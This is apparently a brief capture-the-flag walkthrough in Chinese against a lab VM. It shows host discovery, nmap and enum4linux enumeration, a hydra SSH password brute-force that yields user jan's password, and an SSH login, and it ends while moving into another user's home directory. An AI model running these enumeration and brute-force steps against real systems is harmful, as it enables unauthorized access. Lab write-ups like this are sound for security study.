

##### 攻擊主機：Kali_Linux_2019.3 
##### 靶機：JIS-CTF-VulnUpload-CTF01

**Kali>** <code>arp-scan -l</code> (尋找靶機)<br/>
**Kali>** <code>nmap -A 192.168.203.132</code> (去看他開啟了甚麼port) <br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/587481ef-dc6a-4eb7-b822-6aaab8f60a39)
(我發現他開啟了22port，那就可以走簡單的ssh，也發現他有開samba 我選擇走enum4linux)<br/>
**Kali>** <code>enum4linux 192.168.203.132</code> (掃描，看看能掃到甚麼)<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/934b796a-fdba-4e40-9714-ea289b312fed)
(得到兩個使用者帳號 Kay 和 Jan)<br/>
(Jan 權限較低，較好攻擊)<br/>
**kali>**  <code>hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.203.132 ssh</code> (破解密碼)<br/>
(得到帳號jan的密碼：armando)<br/>
**kali>** <code>ssh jan@192.168.203.132</code>(連線到jan的帳號)<br/>
**Jan>** <code>sudo -l</code>(測試我的權限)(發現權限不足，改入侵kay)<br/>
**Jan>** <code>pwd</code>(查看我在哪裡)<br/>
**Jan>** <code>cd ..</code><br/>
**Jan>** <code>ls -al</code><br/>
**Jan>** <code>cd /home/kay</code>(移動到kay的檔案夾下)<br/>

